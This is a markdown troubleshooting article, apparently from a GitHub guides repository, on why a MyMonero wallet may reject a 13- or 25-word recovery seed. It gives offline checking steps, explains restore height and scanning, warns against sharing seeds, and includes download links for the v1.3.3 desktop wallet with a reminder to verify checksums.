<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Seed Not Accepted</h1>
<p align="center">Check the format and your own backup without exposing recovery words.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
A MyMonero seed may be rejected if the restore option expects a different format, the phrase was copied incorrectly, or the backup is incomplete. MyMonero uses either a 13-word legacy phrase or a 25-word standard Monero phrase; keep yours private while checking.

## You'll see this if
- A wallet says your recovery phrase is invalid or has the wrong number of words.
- The restore screen accepts a 25-word phrase but you have 13 words.
- You restored a wallet, but it does not show the expected balance.
- A paper backup has unclear handwriting or a word you are unsure about.
- Someone offers to validate your seed if you send it to them.

## Why it happens
MyMonero has two seed formats: a 13-word MyMonero-specific legacy seed and a standard 25-word Monero seed. The restore form needs to support the format you have. A phrase may also be mistyped, incomplete, out of order, or associated with another wallet. A rejection message alone does not tell you which issue applies, and repeatedly guessing can create confusion.

After accepting a phrase, a wallet may still need to scan from its restore height. Restore height is the block height where scanning begins. An earlier height is safer when uncertain but slower, so an apparently empty wallet does not automatically mean the seed was wrong. MyMonero’s final desktop release is v1.3.3; the old app still opens wallets and sends XMR but is no longer maintained, with no new features or security updates. Hosted servers and web wallet login stopped. See [the seed format guide](./mymonero-seed-13-vs-25-words.md), [restore height details](./mymonero-restore-height-explained.md), and [the release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

---

## Fix
1. **Stop before sharing anything.** Do not post the phrase, a photo, or individual words in a support forum or message. Nobody legitimate asks for your seed. Avoid online seed validators and websites that promise to repair a phrase.
2. **Count the backup offline.** Count the words on your own record. Thirteen words indicates the legacy MyMonero-specific format; 25 indicates the standard Monero format. If the count is different, do not add likely words or omit entries. The backup may be incomplete, or it may not be a seed phrase.
3. **Check the restore option.** Review the wallet’s own instructions and select the option intended for the format you have. Do not try to force a 13-word legacy phrase into a form that expects 25 words or interpret a 25-word phrase as a legacy one. If the selected wallet does not support the format, stop and choose an appropriate route rather than changing the phrase.
4. **Compare with your original record.** Carefully check each entry against the written backup, preserving order and spelling. Avoid autocomplete or translation. If handwriting is unclear, keep the uncertainty private and do not replace a word based on an internet search. Make sure you are looking at the backup for the intended wallet.
5. **Confirm the wallet and context.** If you have more than one seed, check your private notes to make sure you selected the right one. A password, private view key, and private spend key are not interchangeable with a recovery phrase. Do not paste any of these into a troubleshooting message.
6. **Try a restore once the details are clear.** Use only the wallet software you independently selected. Confirm that it is the real application and not a page reached through an unsolicited link. Enter the seed locally in the restore flow. If the phrase is accepted, set the restore height according to your records or the wallet’s guidance.
7. **Allow the scan to finish.** A wallet may need time to scan. If the balance is not shown, check the restore height and wallet sync status before assuming the seed failed. Starting earlier is safer when uncertain but slower. Follow [the MyMonero not-syncing guidance](./mymonero-not-syncing.md) if appropriate.

> [!WARNING]
> Never send your seed, keys, or wallet file to someone who says they can check it. A legitimate helper can explain steps without seeing secret recovery information.

## If that did not work
If the number of words does not match either known MyMonero format, preserve the note and review other private backups. It may be a partial copy or a different credential. Do not invent missing words. Offline recovery of a missing seed word is not confirmed here; avoid online tools or people who claim they can reconstruct it after you provide the rest.

If the phrase is 13 words, check that the restore route explicitly supports MyMonero’s legacy format. If it is 25 words, use the standard Monero restore instructions. Cake Wallet is the only other wallet named here; it runs on iOS, Android, macOS, and Linux, while Windows desktop builds are paused at the time of writing. Confirm current restore support before entering the phrase. The other option is continuing with MyMonero desktop, whose final release is v1.3.3 and which is no longer maintained.

If the phrase is accepted but the wallet appears empty, investigate restore height and scanning before making another wallet. Restore height is the block height to start scanning; an earlier value is safer but slower. Do not sweep or send funds simply to test whether the seed worked. Sweeping sends all funds to a new wallet, so it is a deliberate action, not a diagnostic step. See [the balance shows zero guide](./mymonero-balance-shows-zero.md).

## Prevention
Keep a clear offline backup with the word order intact. Label whether it is a 13-word MyMonero-specific legacy phrase or a 25-word standard Monero phrase, without writing the phrase on the outside of an exposed container. Protect copies from unauthorized access, loss, and damage. Verify the backup privately before you need to restore; do not enter it into a web checker.

Keep a separate record of wallet identity and restore context. Make sure family or trusted arrangements do not disclose the seed inadvertently. Review [safe seed backup practices](./mymonero-backup-seed-safely.md) and [finding your MyMonero seed](./find-mymonero-seed.md). For download integrity, use SHA-256 rather than a seed phrase; read [the checksum guide](./verify-mymonero-download-sha256.md).

## FAQ
<details><summary>Does 13 words mean my seed is broken?</summary>

No. MyMonero has a 13-word legacy format specific to MyMonero. Choose a restore path that supports it.

</details>

<details><summary>Should I add words until the screen accepts it?</summary>

No. Do not invent or omit words. Check the original backup and restore format.

</details>

<details><summary>Can a support person check my seed?</summary>

No. Never disclose it. Nobody legitimate asks for your seed to troubleshoot a restore.

</details>

<details><summary>The seed was accepted but my balance is missing. Is it wrong?</summary>

Not necessarily. Check that scanning has completed and that the restore height is appropriate.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Lost Seed Word](./mymonero-lost-seed-word.md) | Protect what remains of your backup and avoid risky guesses. |
| [MyMonero Private View and Spend Keys](./mymonero-private-view-spend-keys.md) | Learn what these wallet credentials mean and how to keep them private. |
| [Forgot MyMonero Password](./mymonero-forgot-password.md) | Separate an app password problem from wallet recovery. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
